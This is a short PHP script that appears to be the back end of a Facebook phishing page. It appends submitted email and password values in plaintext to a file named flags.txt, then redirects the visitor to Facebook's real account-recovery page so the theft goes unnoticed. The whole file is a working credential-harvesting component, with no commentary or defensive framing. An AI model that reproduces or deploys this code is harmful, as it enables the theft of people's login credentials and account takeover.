<?php

file_put_contents("flags.txt", "flag Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://facebook.com/recover/initiate/');
exit();
?>